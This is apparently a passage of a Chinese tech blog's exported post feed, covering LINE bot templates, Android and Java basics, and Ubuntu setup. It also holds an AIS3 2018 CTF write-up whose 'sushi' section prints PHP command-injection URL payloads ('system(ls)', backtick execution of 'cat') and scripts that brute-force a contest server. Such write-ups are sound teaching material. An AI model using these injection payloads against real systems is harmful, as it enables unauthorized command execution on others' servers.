label=<span class="string">'postback'</span>,</span><br><span class="line">                text=<span class="string">'postback text'</span>,</span><br><span class="line">                data=<span class="string">'action=buy&amp;itemid=1'</span></span><br><span class="line">            ),</span><br><span class="line">            MessageTemplateAction(</span><br><span class="line">                label=<span class="string">'message'</span>,</span><br><span class="line">                text=<span class="string">'message text'</span></span><br><span class="line">            ),</span><br><span class="line">            URITemplateAction(</span><br><span class="line">                label=<span class="string">'uri'</span>,</span><br><span class="line">                uri=<span class="string">'http://example.com/'</span></span><br><span class="line">            )</span><br><span class="line">        ]</span><br><span class="line">    )</span><br><span class="line">)</span><br><span class="line">line_bot_api.reply_message(event.reply_token, message)</span><br></pre></td></tr></table></figure><h3 id="TemplateSendMessage-ConfirmTemplate（確認介面訊息）">TemplateSendMessage - ConfirmTemplate（確認介面訊息）</h3><p>![](<span class="exturl" data-url="aHR0cHM6Ly9pLmltZ3VyLmNvbS9VOE5EaHJ0LnBuZw==">https://i.imgur.com/U8NDhrt.png<i class="fa fa-external-link-alt"></i></span> =250x)</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">message = TemplateSendMessage(</span><br><span class="line">    alt_text=<span class="string">'Confirm template'</span>,</span><br><span class="line">    template=ConfirmTemplate(</span><br><span class="line">        text=<span class="string">'Are you sure?'</span>,</span><br><span class="line">        actions=[</span><br><span class="line">            PostbackTemplateAction(</span><br><span class="line">                label=<span class="string">'postback'</span>,</span><br><span class="line">                text=<span class="string">'postback text'</span>,</span><br><span class="line">                data=<span class="string">'action=buy&amp;itemid=1'</span></span><br><span class="line">            ),</span><br><span class="line">            MessageTemplateAction(</span><br><span class="line">                label=<span class="string">'message'</span>,</span><br><span class="line">                text=<span class="string">'message text'</span></span><br><span class="line">            )</span><br><span class="line">        ]</span><br><span class="line">    )</span><br><span class="line">)</span><br><span class="line">line_bot_api.reply_message(event.reply_token, message)</span><br></pre></td></tr></table></figure><h3 id="TemplateSendMessage-CarouselTemplate">TemplateSendMessage - CarouselTemplate</h3><p>![](<span class="exturl" data-url="aHR0cHM6Ly9pLmltZ3VyLmNvbS85ODJHbGdvLnBuZw==">https://i.imgur.com/982Glgo.png<i class="fa fa-external-link-alt"></i></span> =250x)</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">message = TemplateSendMessage(</span><br><span class="line">    alt_text=<span class="string">'Carousel template'</span>,</span><br><span class="line">    template=CarouselTemplate(</span><br><span class="line">        columns=[</span><br><span class="line">            CarouselColumn(</span><br><span class="line">                thumbnail_image_url=<span class="string">'https://example.com/item1.jpg'</span>,</span><br><span class="line">                title=<span class="string">'this is menu1'</span>,</span><br><span class="line">                text=<span class="string">'description1'</span>,</span><br><span class="line">                actions=[</span><br><span class="line">                    PostbackTemplateAction(</span><br><span class="line">                        label=<span class="string">'postback1'</span>,</span><br><span class="line">                        text=<span class="string">'postback text1'</span>,</span><br><span class="line">                        data=<span class="string">'action=buy&amp;itemid=1'</span></span><br><span class="line">                    ),</span><br><span class="line">                    MessageTemplateAction(</span><br><span class="line">                        label=<span class="string">'message1'</span>,</span><br><span class="line">                        text=<span class="string">'message text1'</span></span><br><span class="line">                    ),</span><br><span class="line">                    URITemplateAction(</span><br><span class="line">                        label=<span class="string">'uri1'</span>,</span><br><span class="line">                        uri=<span class="string">'http://example.com/1'</span></span><br><span class="line">                    )</span><br><span class="line">                ]</span><br><span class="line">            ),</span><br><span class="line">            CarouselColumn(</span><br><span class="line">                thumbnail_image_url=<span class="string">'https://example.com/item2.jpg'</span>,</span><br><span class="line">                title=<span class="string">'this is menu2'</span>,</span><br><span class="line">                text=<span class="string">'description2'</span>,</span><br><span class="line">                actions=[</span><br><span class="line">                    PostbackTemplateAction(</span><br><span class="line">                        label=<span class="string">'postback2'</span>,</span><br><span class="line">                        text=<span class="string">'postback text2'</span>,</span><br><span class="line">                        data=<span class="string">'action=buy&amp;itemid=2'</span></span><br><span class="line">                    ),</span><br><span class="line">                    MessageTemplateAction(</span><br><span class="line">                        label=<span class="string">'message2'</span>,</span><br><span class="line">                        text=<span class="string">'message text2'</span></span><br><span class="line">                    ),</span><br><span class="line">                    URITemplateAction(</span><br><span class="line">                        label=<span class="string">'uri2'</span>,</span><br><span class="line">                        uri=<span class="string">'http://example.com/2'</span></span><br><span class="line">                    )</span><br><span class="line">                ]</span><br><span class="line">            )</span><br><span class="line">        ]</span><br><span class="line">    )</span><br><span class="line">)</span><br><span class="line">line_bot_api.reply_message(event.reply_token, message)</span><br></pre></td></tr></table></figure><h3 id="TemplateSendMessage-ImageCarouselTemplate">TemplateSendMessage - ImageCarouselTemplate</h3><p>![](<span class="exturl" data-url="aHR0cHM6Ly9pLmltZ3VyLmNvbS8yeXMxcXFjLnBuZw==">https://i.imgur.com/2ys1qqc.png<i class="fa fa-external-link-alt"></i></span> =250x)</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">message = TemplateSendMessage(</span><br><span class="line">    alt_text=<span class="string">'ImageCarousel template'</span>,</span><br><span class="line">    template=ImageCarouselTemplate(</span><br><span class="line">        columns=[</span><br><span class="line">            ImageCarouselColumn(</span><br><span class="line">                image_url=<span class="string">'https://example.com/item1.jpg'</span>,</span><br><span class="line">                action=PostbackTemplateAction(</span><br><span class="line">                    label=<span class="string">'postback1'</span>,</span><br><span class="line">                    text=<span class="string">'postback text1'</span>,</span><br><span class="line">                    data=<span class="string">'action=buy&amp;itemid=1'</span></span><br><span class="line">                )</span><br><span class="line">            ),</span><br><span class="line">            ImageCarouselColumn(</span><br><span class="line">                image_url=<span class="string">'https://example.com/item2.jpg'</span>,</span><br><span class="line">                action=PostbackTemplateAction(</span><br><span class="line">                    label=<span class="string">'postback2'</span>,</span><br><span class="line">                    text=<span class="string">'postback text2'</span>,</span><br><span class="line">                    data=<span class="string">'action=buy&amp;itemid=2'</span></span><br><span class="line">                )</span><br><span class="line">            )</span><br><span class="line">        ]</span><br><span class="line">    )</span><br><span class="line">)</span><br><span class="line">line_bot_api.reply_message(event.reply_token, message)</span><br></pre></td></tr></table></figure><!-- rebuild by neat -->]]></content>
      <categories>
        <category>LineBot</category>
      </categories>
      <tags>
        <tag>教學</tag>
        <tag>Line</tag>
        <tag>Bot</tag>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>在 static method  中取得 String Resource</title>
    <url>/%E5%9C%A8-static-method-%E5%8F%96%E5%BE%97-String-Resourse/</url>
    <content><![CDATA[<!-- build time:Wed Apr 22 2020 17:07:35 GMT+0800 (台北標準時間) --><h2 id="遇到問題">遇到問題</h2><p>最近在寫一個 Singleton 的類別時，遇到需要透過 Resource id 取得 string 的需求，原本想用 context.getString(int resId) 的方式取得，但發現 Context 不適合被 static 成員或類別引用，會導致內存泄露。</p><a id="more"></a><pre><code>static 成員生命週期會隨著 app 開始到結束。
如果引用到 Context、Activity，會導致 Context、Activity 也跟著無法被回收，導致內存泄露。
</code></pre><h2 id="解決辦法">解決辦法</h2><p>使用 Resources.getSystem().getString(int resId) 來取得 String。</p><h2 id="參考資料">參考資料</h2><p><span class="exturl" data-url="aHR0cHM6Ly9zZWdtZW50ZmF1bHQuY29tL3EvMTAxMDAwMDAwODEzMTk3OQ==">https://segmentfault.com/q/1010000008131979<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly9zdGFja292ZXJmbG93LmNvbS9xdWVzdGlvbnMvMzgyMjczMi9hbmRyb2lkLWdldHN0cmluZ3Itc3RyaW5nLWluLXN0YXRpYy1tZXRob2Q=">https://stackoverflow.com/questions/3822732/android-getstringr-string-in-static-method<i class="fa fa-external-link-alt"></i></span></p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>Android</tag>
      </tags>
  </entry>
  <entry>
    <title>在 Ubuntu 上安裝中文輸入法</title>
    <url>/%E5%9C%A8Ubuntu%E4%B8%8A%E5%AE%89%E8%A3%9D%E4%B8%AD%E6%96%87%E8%BC%B8%E5%85%A5%E6%B3%95/</url>
    <content><![CDATA[<!-- build time:Wed Apr 22 2020 17:07:35 GMT+0800 (台北標準時間) --><ol><li>點擊「系統設定值」的按鈕<br><img data-src="https://i.imgur.com/8weBEw1.jpg" alt=""></li></ol><a id="more"></a><ol start="2"><li><p>點擊「語言支援」<br><img data-src="https://i.imgur.com/QC1VYHK.jpg" alt=""></p></li><li><p>第一次打開，會跳出「安裝語言尚未支援完備」，這邊點擊「安裝」<br><img data-src="https://i.imgur.com/ovNfLFq.jpg" alt=""></p></li><li><p>這邊會讓你輸入你剛剛設定的密碼，並等待安裝完畢<br><img data-src="https://i.imgur.com/Ja9Ovqj.jpg" alt=""></p></li><li><p>安裝完後重新開機<br><img data-src="https://i.imgur.com/omw1N1Z.jpg" alt=""></p></li><li><p>開機完後點右上角的鍵盤圖示，然後點選「ConfigureFcitx」<br><img data-src="https://i.imgur.com/FWRbEQr.jpg" alt=""></p></li><li><p>點選左下角的「＋」來新增輸入法<br><img data-src="https://i.imgur.com/nzGCa1U.jpg" alt=""></p></li><li><p>這邊推薦安裝「新酷音」<br><img data-src="https://i.imgur.com/L5HrnOT.jpg" alt=""></p></li><li><p>安裝完後可以在輸入法列表裡看到你剛剛選擇的輸入法，這邊可以調整輸入法順序<br><img data-src="https://i.imgur.com/vqiw8Yx.jpg" alt=""></p></li></ol><!-- rebuild by neat -->]]></content>
  </entry>
  <entry>
    <title>型態、變數與運算子 - Java</title>
    <url>/%E5%9E%8B%E6%85%8B%E3%80%81%E8%AE%8A%E6%95%B8%E8%88%87%E9%81%8B%E7%AE%97%E5%AD%90-Java/</url>
    <content><![CDATA[<!-- build time:Wed Apr 22 2020 17:07:35 GMT+0800 (台北標準時間) --><h2 id="資料型態">資料型態</h2><h3 id="何謂資料型態？">何謂資料型態？</h3><p>程式儲存資料的型態</p><a id="more"></a><h3 id="認識資料型態">認識資料型態</h3><p>常常聽到別人提到 Java 是物件導向語言，不過 Java 本身並不是純綷的物件導向語言，像是就型態系統而言，Java 就並非每個值都是物件，而是混合了兩個型態系統：<strong>基本型態（Primitive type）<strong>與</strong>物件型態（Object type）</strong>。</p><h3 id="基本型態（Primitive-type）">基本型態（Primitive type）</h3><p>在 Java 語言中有八種<strong>基本型態( Primitive Type )</strong>，可分作四個大類</p><ul><li>整數型態：byte、short、int、long</li><li>浮點數型態：float、double</li><li>字元型態：char</li><li>邏輯型態：boolean</li></ul><h3 id="整數型態">整數型態</h3><p>用於儲存整數</p><table><thead><tr><th>型態</th><th>長度</th><th>範圍</th></tr></thead><tbody><tr><td>byte</td><td>8 bits</td><td>−2^7^到2^7^−1</td></tr><tr><td>short</td><td>16 bits</td><td>−2^15^到2^15^−1</td></tr><tr><td>int</td><td>32 bits</td><td>−2^31^到2^31^−1</td></tr><tr><td>long</td><td>64 bits</td><td>−2^63^到2^63^−1</td></tr></tbody></table><h3 id="浮點數型態">浮點數型態</h3><p>用於儲存小數，<code>double</code>浮點數使用的記憶體空間比<code>float</code>浮點數來得多，可表示的精確度也比較大。想要了解確切的範圍，可以自行Google</p><table><thead><tr><th>型態</th><th>長度</th></tr></thead><tbody><tr><td>float</td><td>32 bits</td></tr><tr><td>double</td><td>64 bits</td></tr></tbody></table><h3 id="字元型態">字元型態</h3><p><code>char</code>型態用來儲存<code>'A'</code>、<code>'B'</code>、<code>'林'</code>等字元符號。每個字元型態佔兩個位元組，中文字元與英文字元在Java中同樣都是用兩個位元組儲存。</p><h3 id="布林型態">布林型態</h3><p><code>boolean</code>型態可儲存<code>true</code>與<code>false</code>，分別代表邏輯的「真」與「假」。</p><h2 id="變數">變數</h2><p>不懂變數概念的可以參考這篇，<span class="exturl" data-url="aHR0cHM6Ly9vcGVuaG9tZS5jYy9Hb3NzaXAvSmF2YS9WYXJpYWJsZS5odG1s">https://openhome.cc/Gossip/Java/Variable.html<i class="fa fa-external-link-alt"></i></span></p><h3 id="變數命名規則">變數命名規則</h3><p>類別以英文大寫字母開頭，若有多個英文單字組成，採取大寫駝峰型 (upper camel case)</p><ul><li>SampleItem</li><li>MyData</li><li>MySimpleThread</li><li>MainActivity</li></ul><p>方法或變數（包括參數、屬性等）以英文小寫字母開頭，若有多個英文單字組成，採取小寫駝峰型 (lower camel case)</p><ul><li>setUpNetworking</li><li>getView</li><li>myActivity</li></ul><h2 id="運算子">運算子</h2><h3 id="單元運算子">單元運算子</h3><table><thead><tr><th>運算子</th><th>功能</th><th>範例</th></tr></thead><tbody><tr><td>+</td><td>正</td><td>+a</td></tr><tr><td>-</td><td>負</td><td>-a</td></tr><tr><td>++</td><td>遞增</td><td>++a, a++</td></tr><tr><td>--</td><td>遞減</td><td>--a, a--</td></tr><tr><td>!</td><td>反轉</td><td>!a</td></tr></tbody></table><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">boolean</span> a = <span class="keyword">true</span>;</span><br><span class="line"><span class="keyword">boolean</span> b = !a;    <span class="comment">// b 會等於 false</span></span><br><span class="line"><span class="keyword">boolean</span> c = !b;    <span class="comment">// c 會等於 true</span></span><br></pre></td></tr></table></figure><h3 id="一般運算子">一般運算子</h3><p>下面為一般運算子，皆須結合兩個運算元，可用在<code>整數</code>及<code>浮點數</code>，計算結果為整數或浮點數</p><table><thead><tr><th>運算子</th><th>功能</th><th>範例</th></tr></thead><tbody><tr><td>+</td><td>加</td><td>a + b</td></tr><tr><td>-</td><td>減</td><td>a - b</td></tr><tr><td>*</td><td>乘</td><td>a * b</td></tr><tr><td>/</td><td>除</td><td>a / b</td></tr><tr><td>%</td><td>取餘數</td><td>a % b</td></tr></tbody></table><h3 id="關係運算子">關係運算子</h3><p>下面為關係運算子，計算結果不是<code>true</code>就是<code>false</code></p><table><thead><tr><th>運算子</th><th>功能</th><th>範例</th></tr></thead><tbody><tr><td>==</td><td>相等</td><td>a == b</td></tr><tr><td>!=</td><td>不相等</td><td>a != b</td></tr><tr><td>&gt;</td><td>大於</td><td>a &gt; b</td></tr><tr><td>&gt;=</td><td>大於等於</td><td>a &gt;= b</td></tr><tr><td>&lt;</td><td>小於</td><td>a &lt; b</td></tr><tr><td>&lt;=</td><td>小於等於</td><td>a &lt;= b</td></tr></tbody></table><h3 id="指派運算子">指派運算子</h3><table><thead><tr><th>運算子</th><th>功能</th><th>範例</th></tr></thead><tbody><tr><td>=</td><td>指派</td><td>a = b</td></tr><tr><td>+=</td><td>相加同時指派</td><td>a += b</td></tr><tr><td>-=</td><td>相減同時指派</td><td>a -= b</td></tr><tr><td>*=</td><td>相乘同時指派</td><td>a *= b</td></tr><tr><td>/=</td><td>相除同時指派</td><td>a /= b</td></tr><tr><td>%=</td><td>取餘數同時指派</td><td>a %= b</td></tr></tbody></table><!-- rebuild by neat -->]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>條件式與迴圈 - Java</title>
    <url>/%E6%A2%9D%E4%BB%B6%E5%BC%8F%E8%88%87%E8%BF%B4%E5%9C%88-Java/</url>
    <content><![CDATA[<!-- build time:Wed Apr 22 2020 17:07:35 GMT+0800 (台北標準時間) --><p>為了告訴電腦特定條件下該做什麼動作，要使用各種條件式來定義程式執行的流程。</p><h2 id="條件式">條件式</h2><p>「如果OOO成立，就要…」，Java提供了 <code>if...else</code> 條件式，語法如下：</p><a id="more"></a><h3 id="if…else">if…else</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (條件式一) &#123;</span><br><span class="line">    陳述句;  </span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (條件式二) &#123;</span><br><span class="line">    陳述句;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    陳述句;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>條件式運算結果為 <code>true</code> 會執行 <code>if</code> 的 <code>{</code> 與 <code>}</code> 中的陳述句，否則執行下一個條件式，如果所有條件是都不符合，則執行 <code>else</code> 的 <code>{</code> 與 <code>}</code> 中的陳述句，如果條件式不成立時並不想作任何事，則 <code>else</code> 可以省略。</p><h3 id="switch">switch</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">switch</span> (變數或運算式) &#123;   </span><br><span class="line">    <span class="keyword">case</span> 整數、字元、字串:   </span><br><span class="line">        陳述句;   </span><br><span class="line">        <span class="keyword">break</span>;   </span><br><span class="line">    <span class="keyword">case</span> 整數、字元、字串:   </span><br><span class="line">        陳述句;   </span><br><span class="line">        <span class="keyword">break</span>;   </span><br><span class="line">    <span class="keyword">default</span>:   </span><br><span class="line">        陳述句;   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先看看 <code>switch</code> 的括號，當中置放要取得值的變數或運算式，值必須是整數、字元、字串，取得值後會開始與 <code>case</code> 中設定的整數、字元、字串比對，如果符合就執行之後的陳述句，直到遇到 <code>break</code>，則離開 <code>switch</code> 區塊，如果沒有符合的整數、字元、字串，則會執行 <code>default</code> 後的陳述句，<code>default</code> 不一定需要，如果沒有預設要處理的動作，可以省略 <code>default</code>。</p><h2 id="迴圈">迴圈</h2><p>在 Java 中如果要進行重複性指令執行，可以使用 for 迴圈式或 while 迴圈</p><h3 id="for">for</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (初始式; 執行結果必須是<span class="keyword">boolean</span>的重複式; 重複式) &#123;  </span><br><span class="line">    陳述句;   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="while">while</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> (條件式) &#123;  </span><br><span class="line">    陳述句;   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="do…while">do…while</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">do</span> &#123;   </span><br><span class="line">    陳述句;   </span><br><span class="line">&#125; <span class="keyword">while</span> (條件式);</span><br></pre></td></tr></table></figure><h3 id="break">break</h3><p>跳出迴圈</p><h3 id="continue">continue</h3><p>進行下一次迴圈</p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>解決 Android Studio 卡頓的問題</title>
    <url>/%E8%A7%A3%E6%B1%BAAndroid-Studio%E5%8D%A1%E9%A0%93%E7%9A%84%E5%95%8F%E9%A1%8C/</url>
    <content><![CDATA[<!-- build time:Wed Apr 22 2020 17:07:35 GMT+0800 (台北標準時間) --><h2 id="問題描述">問題描述</h2><p>在使用 Macbook Pro 13 2017 開發案子，發現 Android Studio 會常常出現卡頓。</p><a id="more"></a><h2 id="解決辦法">解決辦法</h2><p>上網查了一下，發現不少人都有這種狀況。問題好像是出在 Android Studio 的啟動參數限制了 JVM 獲得足夠的記憶體，導致了運行時只能頻繁的與磁盤交換。<br>因此我們要修改一下 Android Studio 的 JVM 參數文件，他的問位置在：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;Applications&#x2F;Android\ Studio.app&#x2F;Contents&#x2F;bin&#x2F;studio.vmoptions</span><br></pre></td></tr></table></figure><p>在我的電腦上，參數預設是：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-Xms256m</span><br><span class="line">-Xmx1280m</span><br><span class="line">-XX:ReservedCodeCacheSize&#x3D;240m</span><br><span class="line">-XX:+UseCompressedOops</span><br></pre></td></tr></table></figure><p>在修改重要設定檔之前，建議先做備份：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd &#x2F;Applications&#x2F;Android\ Studio.app&#x2F;Contents&#x2F;bin&#x2F;</span><br><span class="line">cp studio.vmoptions studio.vmoptions.bak</span><br></pre></td></tr></table></figure><p>以上為 bash 指令，請打開 terminal 輸入。</p><p>第一句是移動到存放 studio.vmoptions 的資料夾底下<br>第二句是將 studio.vmoptions 複製一份備份，並將其命名為 studio.vmoptions.bak</p><p>然後修改 studio.vmoptions 成這樣：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-Xms512m</span><br><span class="line">-Xmx2048m</span><br><span class="line">-XX:ReservedCodeCacheSize&#x3D;768m</span><br><span class="line">-XX:+UseCompressedOops</span><br></pre></td></tr></table></figure><p>如果覺得你記憶體足夠大，可以將 <code>-Xmx</code> 後面的數字改更大。我的電腦為記憶體為 8G，因此我設 2048m。</p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>Android Studio</category>
      </categories>
      <tags>
        <tag>Android Studio</tag>
      </tags>
  </entry>
  <entry>
    <title>AIS3 2018 write-up</title>
    <url>/AIS3-2018-write-up/</url>
    <content><![CDATA[<!-- build time:Wed Apr 22 2020 17:07:35 GMT+0800 (台北標準時間) --><p>今年第二次參加 AIS3 pre-exam 的感想</p><ul><li>要用到程式解的地方滿多的</li><li>Web2 對網路環境不好的人會跑很久</li><li>Misc2 超多假 flag，要找到真的根本要通靈＝＝</li></ul><a id="more"></a><h2 id="Web">Web</h2><h3 id="1-warmup">1. warmup</h3><ol><li><p>打開 <code>開發者工具</code>，可以看到 <code>response headers</code> 裡面有奇怪的 <code>Partial-Flag</code><br><img data-src="https://i.imgur.com/rcEXreL.png" alt=""></p></li><li><p>再看看網址列上有奇怪的參數，嘗試去改改看它，會發現 <code>partial flag</code> 跟著變了<br><img data-src="https://i.imgur.com/DQfYv70.png" alt=""></p></li><li><p>再仔細觀察一下，發現前四個 <code>partial flag</code> 是 AIS3，所以可以知道 <code>partial flag</code> 組合起來就是這題的 <code>flag</code> 了。</p></li><li><p>但這題 <code>flag</code> 有點長，所以我用 Python 來解</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">    r = requests.get(<span class="string">"http://104.199.235.135:31331/index.php?p=&#123;&#125;"</span>.format(i))</span><br><span class="line">    key = r.headers[<span class="string">'Partial-Flag'</span>]</span><br><span class="line">    <span class="keyword">if</span> key == <span class="string">''</span>:</span><br><span class="line">        print(<span class="string">' '</span>, end=<span class="string">''</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(key, end=<span class="string">''</span>)</span><br></pre></td></tr></table></figure></li></ol><h3 id="2-hidden">2. hidden</h3><ol><li><p>打開網頁就看到這行字<br><img data-src="https://i.imgur.com/5OJsVE0.png" alt=""></p></li><li><p>因為看到上面顯示的文字，所以想到 secret page 可能藏在 <code>robots.txt</code> 裡<br><img data-src="https://i.imgur.com/uy25Pq8.png" alt=""></p></li><li><p>進到 <code>_hidden_flag_.php</code> 頁面之後，發現還是沒有看到 <code>flag</code>。<br><img data-src="https://i.imgur.com/ZtBmkWv.png" alt=""></p></li><li><p>打開 <code>開發者工具</code> 查看 HTML，發現按鈕會送出奇怪的 <code>form-data</code>。<br><img data-src="https://i.imgur.com/zz829Vy.png" alt=""></p></li><li><p>按了幾次按鈕後，會發現 <code>c</code> 不斷的再增加， <code>s</code> 也跟著變<br><img data-src="https://i.imgur.com/dsAPbmV.png" alt=""></p></li><li><p>透過 <code>開發者工具</code> 的看看 <code>response</code>，發現了奇怪的假 <code>flag</code><br><img data-src="https://i.imgur.com/MxqkyK1.png" alt=""></p></li><li><p>拿 Python 去跑跑看，跑到幾萬後會發現 <code>response</code> 的 <code>Flag</code> 變了，<code>flag</code> 就出來的</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line">payload = &#123;<span class="string">'c'</span>: <span class="string">"1"</span>, <span class="string">'s'</span>: <span class="string">'3241b876891b9ea67db897e940db6ea9e7e351447546b8da82bbf3693dfe9ebb'</span>&#125;</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    r = requests.post(<span class="string">'http://104.199.235.135:31332/_hidden_flag_.php'</span>, payload)</span><br><span class="line">    soup = BeautifulSoup(r.content, <span class="string">"html.parser"</span>)</span><br><span class="line">    print(r.headers)</span><br><span class="line">    f = open(<span class="string">'ans.txt'</span>, <span class="string">'a'</span>)</span><br><span class="line">    f.write(str(r.headers)+<span class="string">"\n"</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'AIS3&#123;NOT_A_VALID_FLAG&#125;'</span> <span class="keyword">not</span> <span class="keyword">in</span> str(r.headers):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    c = soup.find(<span class="string">"input"</span>, &#123;<span class="string">"name"</span>:<span class="string">'c'</span>&#125;)[<span class="string">'value'</span>]</span><br><span class="line">    s = soup.find(<span class="string">"input"</span>, &#123;<span class="string">"name"</span>:<span class="string">'s'</span>&#125;)[<span class="string">'value'</span>]</span><br><span class="line">    payload = &#123;<span class="string">'c'</span>: c, <span class="string">'s'</span>: s&#125;</span><br></pre></td></tr></table></figure></li></ol><h3 id="3-sushi">3. sushi</h3><p>這題查了一下資料，嘗試很多次，最後發現考的好像是 <code>php double quote</code></p><ol><li><p>可以印出當前檔案目錄</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;104.199.235.135:31333&#x2F;?🍣&#x3D;$&#123;@system(ls)&#125;</span><br></pre></td></tr></table></figure><p><img data-src="https://i.imgur.com/rHdn9mO.png" alt=""></p></li><li><p>因為這題 <code>.htaccess</code> 沒有限制，所以可以直接訪問 <code>flag</code></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;104.199.235.135:31333&#x2F;flag_name_1s_t00_l0ng_QAQQQQQQ</span><br></pre></td></tr></table></figure></li><li><p>不過如果有限制，可以利用下面的解法來印出 <code>flag</code></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;104.199.235.135:31333&#x2F;?🍣&#x3D;&quot;.&#96;$_GET[1]&#96;.&quot;&amp;1&#x3D;cat flag_name_1s_t00_l0ng_QAQQQQQQ</span><br></pre></td></tr></table></figure></li></ol><h2 id="Reverse">Reverse</h2><h3 id="1-find">1. find</h3><p>這題只是將 <code>flag</code> 藏在檔案中，可以用記事本或是編輯器打開，用 <code>ctrl+f</code> 很快就能找到了。</p><ol><li>如果是用 linux 或 mac 有更快的解法<br><img data-src="https://i.imgur.com/70zIglq.png" alt=""></li></ol><h3 id="3-crackme">3. crackme</h3><ol><li><p>猜測這是用 .NET 寫的，所以用 <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tLzB4ZDRkL2RuU3B5">dnSpy<i class="fa fa-external-link-alt"></i></span> 來打開它</p></li><li><p>在 <code>MainWindow</code> 中看到疑似 <code>flag</code> 的東西<br><img data-src="https://i.imgur.com/9eywW9l.png" alt=""></p></li><li><p>發現 <code>secret</code> 是用 XOR 加密然後轉成 int<br><img data-src="https://i.imgur.com/jy0YJuo.png" alt=""></p></li><li><p>用 Python 來解</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line">list = [<span class="number">234</span>, <span class="number">226</span>, <span class="number">248</span>, <span class="number">152</span>, <span class="number">208</span>, <span class="number">154</span>, <span class="number">223</span>, <span class="number">244</span>, <span class="number">226</span>, <span class="number">158</span>, <span class="number">244</span>, <span class="number">238</span>, <span class="number">234</span>, <span class="number">216</span>, <span class="number">210</span>, <span class="number">244</span>, <span class="number">223</span>, <span class="number">228</span>, <span class="number">244</span>, <span class="number">232</span>, <span class="number">249</span>, <span class="number">159</span>, <span class="number">200</span>, <span class="number">192</span>, <span class="number">244</span>, <span class="number">230</span>, <span class="number">206</span>, <span class="number">138</span>, <span class="number">214</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> list:</span><br><span class="line">    print(chr(i^<span class="number">171</span>), end=<span class="string">''</span>)</span><br></pre></td></tr></table></figure></li></ol><h2 id="Misc">Misc</h2><h3 id="1-welcome">1. welcome</h3><p>送分題，看影片拿 flag</p><h3 id="2-flags">2. flags</h3><p>這題可以找到 3 個假 <code>flag</code>，要找到真 <code>flag</code> 根本要通靈＝＝</p><ol><li><p>用編輯器開他，會發現有假 <code>flag</code> 藏在其中</p></li><li><p>將檔名改成 jpg，會看到圖片上面顯示著假 <code>flag</code><br><img data-src="https://i.imgur.com/kZBhDwS.jpg" alt=""></p></li><li><p>用 <code>binwalk</code> 去分析檔案，會發現其中藏著 zip<br><img data-src="https://i.imgur.com/uIHBkQb.png" alt=""></p></li><li><p>用 dd 把其中的 zip 拆出來</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">dd if=flags.jpg of=flag skip=48932 bs=1</span><br></pre></td></tr></table></figure></li><li><p>拆出來的 zip 有密碼，所以用 <code>pkcrack</code> 來破解</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pkcrack -c backup/Avengers_Infinity_War_Poster.jpg -p Avengers_Infinity_War_Poster.jpg -C flag.zip -P photo.zip</span><br></pre></td></tr></table></figure></li><li><p>破解完後拿到裡面的 <code>flag</code> 檔，發現還是假的＝＝</p></li><li><p>最後透過主辦方給出的提示，回到第二步那張圖，盯了老半天，發現那個框框藏有<strong>摩斯密碼</strong>…<br><img data-src="https://i.imgur.com/kZBhDwS.jpg" alt=""></p></li></ol><h2 id="Crypto">Crypto</h2><h3 id="1-POW">1. POW</h3><p>這題考的就是 <code>proof of work</code></p><ol><li>用 Python 暴力去運算比對是否符合條件<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span 